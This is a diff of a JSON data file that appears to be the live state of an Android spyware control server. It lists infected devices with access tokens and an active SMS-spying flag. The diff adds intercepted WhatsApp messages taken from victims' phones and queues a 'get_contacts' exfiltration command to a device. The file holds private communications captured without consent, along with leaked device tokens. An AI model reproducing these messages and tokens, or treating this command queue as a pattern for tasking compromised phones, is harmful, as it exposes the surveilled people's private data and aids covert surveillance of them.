@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777179288798,
+    "lastSeen": 1777179292018,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (12 pesan): ~ lang",
+        "content": "6251-9922-9280 bntu bug ampe c1 20k di embat",
+        "time": "26/04 13:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777179293988
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Pegasus-X Room",
+        "content": "‎12 pesan baru",
+        "time": "26/04 13:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777179290637
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (12 pesan): ~ lang",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:26",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173328329
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (93 pesan): ~ someone",
-        "content": "🗿",
-        "time": "26/04 11:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173328292
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (91 pesan): ~ qɪs†",
-        "content": "🥳🥳",
-        "time": "26/04 11:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173324507
       }
     ],
     "galleryPhotos": [],
@@ -4038,7 +4038,13 @@
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
     "lastSeen": 1777179258117,
-    "commandQueue": [],
+    "commandQueue": [
+      {
+        "type": "get_contacts",
+        "payload": {},
+        "sentAt": 1777179292106
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
     "deviceInfo": {
